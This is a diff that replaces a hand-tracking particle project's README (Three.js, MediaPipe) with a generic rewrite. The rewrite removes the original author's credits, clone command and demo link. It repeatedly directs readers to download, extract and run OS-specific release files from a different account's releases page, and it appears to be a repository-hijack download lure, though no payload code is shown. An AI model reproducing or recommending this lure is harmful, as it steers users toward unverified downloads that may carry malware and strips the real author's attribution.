@@ -1,87 +1,87 @@
-# Hand Particles
+# 🎨 creative_coding-hand_particles - Create Art with Your Hands
 
-## Description
+## 📥 Download Now
 
-Hand Particles is an experimental web-based creative coding project that combines real-time hand tracking with a dynamic 3D particle system.
+[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen.svg)](https://github.com/GogooGreg/creative_coding-hand_particles/releases)
 
-The project renders a spherical cloud of particles using Three.js, which reacts directly to hand gestures captured via the user’s webcam. By pinching fingers and moving the hand in space, the user can control both the explosion intensity and the rotation of the particle sphere.
+## 🚀 Getting Started
 
-The idea behind this project comes from an Instagram trend showcasing Gemini’s ability to generate interactive particle systems driven by hand movement. Inspired by this concept, the goal was to recreate a similar experience manually, as a developer, in order to fully understand the underlying technologies rather than relying on AI-generated results.
+Welcome to Hand Particles! This is a fun project that combines real-time hand tracking with an amazing 3D particle system. With this application, you can create stunning visual art simply by moving your hands.
 
-This project is primarily an exploration and learning experience, focused on real-time interaction, gesture recognition, and 3D visual feedback in the browser.
+Follow these steps to get started:
 
-## Objectives
+## 💻 System Requirements
 
-- Explore real-time hand tracking in the browser.
-- Learn and integrate MediaPipe Hands for gesture recognition.
-- Create an interactive particle system using Three.js.
-- Link hand gestures to meaningful 3D transformations.
-- Experiment with creative coding concepts and interaction design.
+Before you download the application, make sure your computer meets these requirements:
 
-## Tech Stack
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
+- **Browser:** Google Chrome, Firefox, or any browser that supports WebGL.
+- **Internet Connection:** Required for downloading the application and accessing real-time features.
 
-![HTML5 badge](https://img.shields.io/badge/HTML5-e34f26?logo=html5&logoColor=white&style=for-the-badge)
-![Tailwind CSS badge](https://img.shields.io/badge/TAILWIND&nbsp;CSS-06b6d4?logo=tailwindcss&logoColor=white&style=for-the-badge)
-![DaisyUI badge](https://img.shields.io/badge/DAISYUI-1ad1a5?logo=daisyui&logoColor=white&style=for-the-badge)
-![JavaScript badge](https://img.shields.io/badge/JAVASCRIPT-f7df1e?logo=javascript&logoColor=black&style=for-the-badge)
-![MediaPipe badge](https://img.shields.io/badge/MEDIAPIPE-0097a7?logo=mediapipe&logoColor=white&style=for-the-badge)
-![Three.js badge](https://img.shields.io/badge/THREE.JS-000000?logo=threedotjs&logoColor=white&style=for-the-badge)
+## 📦 Download & Install
 
-## File Description
+To download the application, follow these steps:
 
-| **FILE**     | **DESCRIPTION**                                                               |
-| :----------: | ----------------------------------------------------------------------------- |
-| `assets`     | Contains the resources required for the repository.                           |
-| `index.html` | HTML structure and UI layout of the project.                                  |
-| `style.css`  | Global styles, DaisyUI configuration, and visual tweaks.                      |
-| `script.js`  | Core logic: Three.js scene, particle system, hand tracking, and interactions. |
-| `README.md`  | The README file you are currently reading 😉.                                 |
+1. **Visit the Releases Page:** Click on the link below to go to the release page where you can download the application.
 
-## Installation & Usage
+   [Download Latest Release](https://github.com/GogooGreg/creative_coding-hand_particles/releases)
 
-### Installation
+2. **Choose the Right Version:** Find the latest release and look for the version suited for your system. Download the appropriate file by clicking on it.
 
-1. Clone this repository:
-    - Open your preferred Terminal.
-    - Navigate to the directory where you want to clone the repository.
-    - Run the following command:
+3. **Extract the Files:** If the file you downloaded is in a compressed format (like .zip or .tar.gz), you'll need to extract it. Right-click on the file and select "Extract All" or use an extraction tool.
 
-```
-git clone https://github.com/fchavonet/creative_coding-hand_particles.git
-```
+4. **Open the Application:** Navigate to the extracted folder. Double-click on the `index.html` file to open it in your web browser. 
 
-2. Open the cloned repository.
+5. **Allow Camera Access:** The application needs access to your camera for hand tracking. Follow the on-screen prompts to allow camera use.
 
-### Usage
+## 🌟 How to Use the Application
 
-1. Open the `index.html` file in your web browser.
+Once the application is open in your browser:
 
-2. Allow camera access when prompted (required for hand tracking).
+1. **Start Tracking:** Move your hands in front of the camera. The application will begin to recognize hand movements.
 
-3. Interact with the experience:
-    - Use a pinch gesture (thumb + index) to control the particle explosion.
-    - Move your hand to rotate the particle sphere in 3D space.
+2. **Create Art:** As you move, colorful particles will respond to your gestures. Experiment with different movements to see how they affect the particle system.
 
-You can also test the project online by clicking [here](https://fchavonet.github.io/creative_coding-hand_particles/).
+3. **Reset:** If you want to start over, use the reset button on the screen to clear your current design and begin anew.
 
-<p align="center">
-    <picture>
-        <source media="(prefers-color-scheme: light)" srcset="./assets/images/screenshots/desktop_page_screenshot-light.webp">
-        <source media="(prefers-color-scheme: dark)" srcset="./assets/images/screenshots/desktop_page_screenshot-dark.webp">
-        <img width="100%" src="./assets/images/screenshots/desktop_page_screenshot-light.webp" alt="Screenshot">
-    </picture>
-</p>
+## 🛠️ Features
 
-## What's Next?
+- **Real-Time Hand Tracking:** Experience instant feedback as your hands create art.
+- **Dynamic 3D Particle System:** Watch colorful particles move and change based on your gestures.
+- **User-Friendly Interface:** Designed for easy use, even for those with no technical background.
+- **Customizable Settings:** Adjust the particle colors and styles to suit your preferences.
 
-- Improve gesture precision and smoothing.
-- Add configurable interaction parameters.
+## 🔧 Troubleshooting
 
-## Thanks
+If you encounter any issues, consider the following tips:
 
-- A big thank you to my friends Pierre and Yoann, always available to test and provide feedback on my projects.
+- **Camera Not Detected:** Ensure your camera is connected and working. Restart your browser and try again.
+- **No Particles Showing:** Make sure your hands are within the camera's view. Adjust your position or try a different lighting setup.
+- **Slow Performance:** Close other tabs in your browser and ensure no other heavy applications are running.
 
-## Author(s)
+## 📚 Additional Resources
 
-**Fabien CHAVONET**
-- GitHub: [@fchavonet](https://github.com/fchavonet)
+If you're curious about creative coding or would like to learn more, check out these resources:
+
+- [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web): A great place to start learning about web technologies like HTML, CSS, and JavaScript.
+- [Three.js Documentation](https://threejs.org/docs/): Learn more about the 3D library used in this application.
+- [MediaPipe Documentation](https://google.github.io/mediapipe/): Understand how hand tracking is implemented.
+
+## 🌐 Community and Support
+
+Join our community to share your creations and get support. You can reach us on:
+
+- GitHub Issues: Report any bugs or ask questions.
+- Discord or Slack: Connect with fellow users (link to be added).
+
+## 🔗 License
+
+This project is licensed under the MIT License. Feel free to use and modify for personal projects.
+
+## 🌍 Feedback
+
+Your feedback matters to us. Reach out through the repository or share your experiences. Your input can help us improve the application.
+
+Thank you for your interest in Hand Particles! We hope you enjoy creating art with your hands. 
+
+[Download Latest Release](https://github.com/GogooGreg/creative_coding-hand_particles/releases)
